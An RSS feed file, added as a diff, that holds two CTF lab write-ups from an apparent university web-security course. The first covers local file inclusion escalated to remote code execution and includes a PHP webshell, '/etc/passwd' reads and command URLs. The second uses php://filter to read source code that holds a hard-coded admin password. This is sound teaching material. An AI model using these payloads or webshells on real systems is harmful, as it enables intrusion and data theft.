@@ -1,0 +1,132 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>SBK Hugo Site</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/lfi/</link><description>Recent content on SBK Hugo Site</description><generator>Hugo</generator><language>en-us</language><atom:link href="https://bernie6401.github.io/docs/security/course/ntust-ws/lfi/index.xml" rel="self" type="application/rss+xml"/><item><title>Simple Web 0x07(Lab - `HakkaMD`)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/lfi/simple-web-0x07lab---hakkamd/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/lfi/simple-web-0x07lab---hakkamd/</guid><description>&lt;h1 id="simple-web-0x07lab---hakkamd">
+ Simple Web 0x07(Lab - &lt;code>HakkaMD&lt;/code>)
+ &lt;a class="anchor" href="#simple-web-0x07lab---hakkamd">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ntustws-ctf-web">
+ tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8401">http://h4ck3r.quest:8401&lt;/a>&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10241555">資安這條路-Local File Inclusion&lt;/a>&lt;/p>
+&lt;h2 id="exploit---lfi-to-rce">
+ Exploit - LFI to RCE
+ &lt;a class="anchor" href="#exploit---lfi-to-rce">#&lt;/a>
+&lt;/h2>
+&lt;ol>
+&lt;li>First things first, the website has &lt;code>LFI&lt;/code> problem
+&lt;code>http://h4ck3r.quest:8401/?module=/etc/passwd&lt;/code>
+&lt;img src="https://i.imgur.com/Efl4E0c.png" alt="" />&lt;/li>
+&lt;li>&lt;font color="FF0000">&lt;strong>通靈&lt;/strong>&lt;/font>
+It provided &lt;code>phpinfo()&lt;/code> so that we can check the save address of session.
+&lt;img src="https://i.imgur.com/SO727sY.png" alt="" />
+The setting is default, thus we can use &lt;code>LFI&lt;/code> to read session file:
+&lt;code>http://h4ck3r.quest:8401/?module=/tmp/sess_0qvmvnk5lh140239e6ol9l16h1&lt;/code>
+&lt;img src="https://i.imgur.com/AiLGZJA.png" alt="" />
+We can see that session file store the data of what we enter. Therefore, we could enter &lt;code>webshell&lt;/code> to get shell&lt;/li>
+&lt;li>&lt;code>webshell&lt;/code>
+&lt;code>&amp;lt;?php system($_GET['sh']); ?&amp;gt;&lt;/code>
+↓
+&lt;code>http://h4ck3r.quest:8401/?module=/tmp/sess_2f0dilri9ju4553th2bkclefal&amp;amp;sh=ls%20/&lt;/code>
+↓
+&lt;img src="https://i.imgur.com/kqlIf6z.png" alt="" />
+↓
+&lt;code>http://h4ck3r.quest:8401/?module=/tmp/sess_2f0dilri9ju4553th2bkclefal&amp;amp;sh=cat%20/flag_aff6136bbef82137&lt;/code>&lt;/li>
+&lt;li>Then we got flag!!!&lt;/li>
+&lt;/ol></description></item><item><title>Simple Web 0x08(Lab - My First Meow Website)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/lfi/simple-web-0x08lab---my-first-meow-website/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/lfi/simple-web-0x08lab---my-first-meow-website/</guid><description>&lt;h1 id="simple-web-0x08lab---my-first-meow-website">
+ Simple Web 0x08(Lab - My First Meow Website)
+ &lt;a class="anchor" href="#simple-web-0x08lab---my-first-meow-website">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ntustws-ctf-web">
+ tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8400/">http://h4ck3r.quest:8400/&lt;/a>
+Target: Login as Admin&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10245020">PHP 偽協議 (一) &lt;/a>
+&lt;a href="https://youtu.be/_hasOTGximc?t=2855">Web Security 0x1&lt;/a>&lt;/p>
+&lt;h2 id="exploit">
+ Exploit
+ &lt;a class="anchor" href="#exploit">#&lt;/a>
+&lt;/h2>
+&lt;ol>
+&lt;li>Observe
+According to the URL, &lt;code>http://h4ck3r.quest:8400/?page=inc/home&lt;/code>, it might have &lt;code>LFI&lt;/code> problem.&lt;/li>
+&lt;li>Use &lt;code>php://filter&lt;/code> to read page
+&lt;code>http://h4ck3r.quest:8400/?page=php://filter/convert.base64-encode/resource=inc/home&lt;/code>
+:::spoiler page source code
+&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;!DOCTYPE html&amp;gt;
+&amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;
+
+&amp;lt;head&amp;gt;
+ &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;
+ &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34;&amp;gt;
+ &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&amp;gt;
+ &amp;lt;title&amp;gt;Meow&amp;lt;/title&amp;gt;
+ &amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;https://cdn.jsdelivr.net/npm/bulma@0.9.2/css/bulma.min.css&amp;#34;&amp;gt;
+&amp;lt;/head&amp;gt;
+
+&amp;lt;body&amp;gt;
+ &amp;lt;nav class=&amp;#34;navbar is-dark&amp;#34; role=&amp;#34;navigation&amp;#34; aria-label=&amp;#34;main navigation&amp;#34;&amp;gt;
+ &amp;lt;div class=&amp;#34;navbar-brand&amp;#34;&amp;gt;
+ &amp;lt;a class=&amp;#34;navbar-item&amp;#34; href=&amp;#34;/?page=inc/home&amp;#34;&amp;gt;🐱&amp;lt;/a&amp;gt;
+ &amp;lt;/div&amp;gt;
+
+ &amp;lt;div id=&amp;#34;navbarBasicExample&amp;#34; class=&amp;#34;navbar-menu&amp;#34;&amp;gt;
+ &amp;lt;div class=&amp;#34;navbar-start&amp;#34;&amp;gt;
+ &amp;lt;a class=&amp;#34;navbar-item&amp;#34; href=&amp;#34;/?page=inc/home&amp;#34;&amp;gt;
+ Home
+ &amp;lt;/a&amp;gt;
+ &amp;lt;a class=&amp;#34;navbar-item&amp;#34; href=&amp;#34;/?page=inc/about&amp;#34;&amp;gt;
+ About
+ &amp;lt;/a&amp;gt;
+ &amp;lt;a class=&amp;#34;navbar-item&amp;#34; href=&amp;#34;/admin.php&amp;#34;&amp;gt;
+ Admin
+ &amp;lt;/a&amp;gt;
+ &amp;lt;/div&amp;gt;
+ &amp;lt;/div&amp;gt;
+ &amp;lt;/nav&amp;gt;
+
+ &amp;lt;div class=&amp;#34;container&amp;#34; style=&amp;#34;margin-top: 1em;&amp;#34;&amp;gt;
+ &amp;lt;?php
+ if (isset($_GET[&amp;#39;page&amp;#39;]))
+ include($_GET[&amp;#39;page&amp;#39;] . &amp;#34;.php&amp;#34;);
+ else
+ include(&amp;#34;inc/home.php&amp;#34;);
+ ?&amp;gt;
+ &amp;lt;/div&amp;gt;
+&amp;lt;/body&amp;gt;
+
+&amp;lt;/html&amp;gt;
+&lt;/code>&lt;/pre>:::&lt;/li>
+&lt;li>Observe page source code
+We know that &lt;code>admin.php&lt;/code> is under &lt;code>/&lt;/code> directory.
+&lt;code>http://h4ck3r.quest:8400/?page=php://filter/convert.base64-encode/resource=admin&lt;/code>
+:::spoiler admin source code
+&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;h1&amp;gt;Admin Panel&amp;lt;/h1&amp;gt;
+&amp;lt;form&amp;gt;
+ &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;username&amp;#34; value=&amp;#34;admin&amp;#34;&amp;gt;
+ &amp;lt;input type=&amp;#34;password&amp;#34; name=&amp;#34;password&amp;#34;&amp;gt;
+ &amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;Submit&amp;#34;&amp;gt;
+&amp;lt;/form&amp;gt;
+
+&amp;lt;?php
+$admin_account = array(&amp;#34;username&amp;#34; =&amp;gt; &amp;#34;admin&amp;#34;, &amp;#34;password&amp;#34; =&amp;gt; &amp;#34;kqqPFObwxU8HYo8E5QgNLhdOxvZmtPhyBCyDxCwpvAQ&amp;#34;);
+if (
+ isset($_GET[&amp;#39;username&amp;#39;]) &amp;amp;&amp;amp; isset($_GET[&amp;#39;password&amp;#39;]) &amp;amp;&amp;amp;
+ $_GET[&amp;#39;username&amp;#39;] === $admin_account[&amp;#39;username&amp;#39;] &amp;amp;&amp;amp; $_GET[&amp;#39;password&amp;#39;] === $admin_account[&amp;#39;password&amp;#39;]
+) {
+ echo &amp;#34;&amp;lt;h1&amp;gt;LOGIN SUCCESS!&amp;lt;/h1&amp;gt;&amp;lt;p&amp;gt;&amp;#34;.getenv(&amp;#39;FLAG&amp;#39;).&amp;#34;&amp;lt;/p&amp;gt;&amp;#34;;
+}
+
+?&amp;gt;
+&lt;/code>&lt;/pre>:::&lt;/li>
+&lt;li>Then we get admin password is: &lt;code>kqqPFObwxU8HYo8E5QgNLhdOxvZmtPhyBCyDxCwpvAQ&lt;/code>. Then we got flag!!!&lt;/li>
+&lt;/ol></description></item></channel></rss>
